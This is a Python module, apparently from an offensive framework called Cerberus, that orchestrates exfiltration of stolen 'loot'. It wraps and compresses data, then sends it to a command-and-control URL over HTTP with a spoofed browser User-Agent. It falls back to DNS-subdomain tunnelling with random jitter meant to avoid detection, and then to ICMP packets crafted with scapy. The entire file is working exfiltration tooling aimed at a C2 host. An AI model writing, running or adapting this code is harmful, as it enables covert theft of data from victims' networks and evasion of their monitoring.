"""
Evidence Exfiltration Orchestrator - v4.8

Orchestrates multi-channel data exfiltration (HTTP, DNS, ICMP).
All channels now have real implementations connected to their adapters.
Handles data chunking, compression, and channel fallback based on policy.
"""
import asyncio
import logging
import base64
import json
import gzip
import os
import uuid
from enum import Enum
from typing import Optional, Dict, List, Any
from dataclasses import dataclass

# Real adapter imports with explicit warnings
try:
    from backend.exfiltration.dns_tunnel import DNSClientEncoder
except ImportError:
    DNSClientEncoder = None
    logging.getLogger(__name__).warning(
        "DNSClientEncoder not available — DNS exfiltration channel disabled"
    )

try:
    from backend.exfiltration.icmp_exfil import ICMPClientEncoder, SCAPY_AVAILABLE
except ImportError:
    ICMPClientEncoder = None
    SCAPY_AVAILABLE = False
    logging.getLogger(__name__).warning(
        "ICMPClientEncoder not available — ICMP exfiltration channel disabled"
    )

try:
    import aiohttp
except ImportError:
    aiohttp = None
    logging.getLogger(__name__).warning(
        "aiohttp not installed — HTTP exfiltration channel will use fallback"
    )

try:
    from backend.exfiltration.post_exfiltration_policy import (
        get_post_exfiltration_policy,
        PolicyMode,
    )
except ImportError:
    get_post_exfiltration_policy = None

logger = logging.getLogger("cerberus.offensiva.exfil")


class ExfilChannel(str, Enum):
    DNS = "dns"
    ICMP = "icmp"
    HTTP = "http"
    SMB = "smb"
    AUTO = "auto"


@dataclass
class ExfilResult:
    success: bool
    channel: ExfilChannel
    bytes_sent: int
    message: str
    duration_ms: int = 0
    chunks_sent: int = 0


class EvidenceExfilOrchestrator:
    """
    Orchestrates exfiltration of evidence/loot through real channels.

    Channel priority (AUTO mode): HTTP → DNS → ICMP
    Each channel has a real implementation with retry logic.
    """

    def __init__(
        self,
        c2_url: str = "",
        dns_domain: str = "exfil.cerberus.local",
        icmp_destination: str = "",
        http_timeout: int = 30,
        http_retries: int = 3,
    ):
        self.c2_url = c2_url or os.environ.get(
            "CERBERUS_C2_URL", "http://c2.cerberus.local/api/loot"
        )
        self.dns_domain = dns_domain or os.environ.get(
            "CERBERUS_DNS_DOMAIN", "exfil.cerberus.local"
        )
        self.icmp_destination = icmp_destination or os.environ.get(
            "CERBERUS_ICMP_DEST", ""
        )
        self.http_timeout = http_timeout
        self.http_retries = http_retries
        self.session_id = uuid.uuid4().hex[:8]

        # Channel availability
        self._http_available = aiohttp is not None
        self._dns_available = DNSClientEncoder is not None
        self._icmp_available = ICMPClientEncoder is not None and SCAPY_AVAILABLE

        logger.info(
            f"ExfilOrchestrator initialized — HTTP:{self._http_available} "
            f"DNS:{self._dns_available} ICMP:{self._icmp_available}"
        )

    def get_available_channels(self) -> List[ExfilChannel]:
        """Return list of operational channels."""
        channels = []
        if self._http_available and self.c2_url:
            channels.append(ExfilChannel.HTTP)
        if self._dns_available:
            channels.append(ExfilChannel.DNS)
        if self._icmp_available and self.icmp_destination:
            channels.append(ExfilChannel.ICMP)
        return channels

    async def exfiltrate(
        self,
        data: bytes,
        target: str,
        filename: str,
        preferred_channel: ExfilChannel = ExfilChannel.AUTO,
    ) -> ExfilResult:
        """
        Exfiltrate data via the best available channel.

        Args:
            data: Raw bytes to exfiltrate
            target: Identifier of the target (domain/IP)
            filename: Name of the file/evidence
            preferred_channel: Preferred channel or AUTO for fallback chain
        """
        # 1. Policy Check
        if get_post_exfiltration_policy:
            policy = get_post_exfiltration_policy()
            if not policy.can_exfiltrate(target, len(data)):
                logger.warning(f"Exfiltration blocked by policy for {target}")
                return ExfilResult(
                    False, preferred_channel, 0, "Blocked by policy"
                )
            policy.record_exfiltration(
                target, len(data), str(preferred_channel), "evidence_collection"
            )

        # 2. Prepare Data (Compress + Wrap)
        payload = self._prepare_payload(data, filename)

        # 3. Channel Selection & Execution with fallback
        start_time = asyncio.get_event_loop().time()

        # Build ordered channel list based on preference
        if preferred_channel == ExfilChannel.AUTO:
            channels_to_try = [ExfilChannel.HTTP, ExfilChannel.DNS, ExfilChannel.ICMP]
        else:
            channels_to_try = [preferred_channel]

        last_error = "No channels attempted"
        for channel in channels_to_try:
            try:
                success, chunks = await self._try_channel(channel, payload, target)
                if success:
                    duration = int(
                        (asyncio.get_event_loop().time() - start_time) * 1000
                    )
                    return ExfilResult(
                        True,
                        channel,
                        len(data),
                        f"Exfiltration successful via {channel.value}",
                        duration,
                        chunks,
                    )
            except Exception as e:
                last_error = f"{channel.value}: {str(e)}"
                logger.warning(f"Channel {channel.value} failed: {e}")
                continue

        return ExfilResult(False, ExfilChannel.AUTO, 0, f"All channels failed — {last_error}")

    async def _try_channel(
        self, channel: ExfilChannel, payload: bytes, target: str
    ) -> tuple:
        """Route to appropriate channel implementation. Returns (success, chunks_sent)."""
        if channel == ExfilChannel.HTTP:
            return await self._try_http(payload), 1
        elif channel == ExfilChannel.DNS:
            chunks = await self._try_dns(payload)
            return chunks > 0, chunks
        elif channel == ExfilChannel.ICMP:
            return await self._try_icmp(payload, target), 1
        else:
            raise ValueError(f"Unsupported channel: {channel}")

    def _prepare_payload(self, data: bytes, filename: str) -> bytes:
        """Compress and wrap data with metadata."""
        meta = {
            "filename": filename,
            "size": len(data),
            "session_id": self.session_id,
            "content": base64.b64encode(data).decode(),
        }
        json_bytes = json.dumps(meta).encode()
        compressed = gzip.compress(json_bytes)
        return compressed

    # ── HTTP Channel (Real Implementation) ─────────────────────────────
    async def _try_http(self, payload: bytes) -> bool:
        """
        HTTP POST exfiltration with retry and exponential backoff.
        Uses aiohttp for async HTTP requests to the configured C2 URL.
        """
        if not self._http_available:
            logger.debug("HTTP channel unavailable (aiohttp not installed)")
            return False

        if not self.c2_url:
            logger.debug("HTTP channel unavailable (no C2 URL configured)")
            return False

        timeout = aiohttp.ClientTimeout(total=self.http_timeout)
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for attempt in range(self.http_retries):
                    try:
                        headers = {
                            "Content-Type": "application/octet-stream",
                            "X-Session-Id": self.session_id,
                            "X-Content-Encoding": "gzip",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        }
                        async with session.post(
                            self.c2_url, data=payload, headers=headers
                        ) as resp:
                            if resp.status < 300:
                                logger.info(
                                    f"HTTP exfil successful: {len(payload)} bytes, "
                                    f"status {resp.status}"
                                )
                                return True
                            else:
                                logger.warning(
                                    f"HTTP exfil attempt {attempt + 1}: "
                                    f"status {resp.status}"
                                )
                    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                        wait_time = 2**attempt
                        logger.warning(
                            f"HTTP exfil attempt {attempt + 1} failed: {e}, "
                            f"retrying in {wait_time}s"
                        )
                        await asyncio.sleep(wait_time)
        except Exception as e:
            logger.error(f"HTTP exfil session error: {e}")

        return False

    # ── DNS Channel (Real Implementation) ───────────────────────────────
    async def _try_dns(self, payload: bytes) -> int:
        """
        DNS tunneling exfiltration using DNSClientEncoder.
        Encodes payload into DNS subdomain queries.
        Returns number of chunks sent, 0 on failure.
        """
        if not self._dns_available:
            logger.debug("DNS channel unavailable (DNSClientEncoder not available)")
            return 0

        try:
            encoder = DNSClientEncoder(
                domain=self.dns_domain, session_id=self.session_id[:4]
            )
            # Encode payload into DNS queries
            queries = encoder.encode_file(payload, chunk_size=30)
            logger.info(
                f"DNS exfil: encoding {len(payload)} bytes into {len(queries)} queries"
            )

            # Send each DNS query with jitter
            import socket
            import random

            for i, query_domain in enumerate(queries):
                try:
                    # Perform actual DNS lookup — the query itself IS the exfil
                    socket.getaddrinfo(query_domain, None, socket.AF_INET)
                except socket.gaierror:
                    # NXDOMAIN is expected — the data is in the query, not the response
                    pass
                except Exception as e:
                    logger.debug(f"DNS query {i} error (expected): {e}")

                # Jitter between queries to avoid detection
                await asyncio.sleep(random.uniform(0.05, 0.3))

            logger.info(f"DNS exfil completed: {len(queries)} queries sent")
            return len(queries)

        except Exception as e:
            logger.error(f"DNS exfil failed: {e}")
            return 0

    # ── ICMP Channel (Real Implementation) ──────────────────────────────
    async def _try_icmp(self, payload: bytes, target: str) -> bool:
        """
        ICMP ping exfiltration using ICMPClientEncoder.
        Encodes payload into ICMP Echo Request packets via scapy.
        Requires root/admin privileges.
        """
        if not self._icmp_available:
            logger.debug("ICMP channel unavailable (scapy or ICMPClientEncoder missing)")
            return False

        destination = self.icmp_destination or target
        if not destination:
            logger.debug("ICMP channel: no destination configured")
            return False

        try:
            encoder = ICMPClientEncoder(
                destination=destination,
                session_id=self.session_id[:4],
            )
            # send_data uses scapy to send ICMP packets with payload chunks
            # Run in executor since scapy's send() is blocking
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, encoder.send_data, payload)

            logger.info(
                f"ICMP exfil completed: {len(payload)} bytes to {destination}"
            )
            return True

        except PermissionError:
            logger.warning("ICMP exfil requires root/admin privileges")
            return False
        except Exception as e:
            logger.error(f"ICMP exfil failed: {e}")
            return False
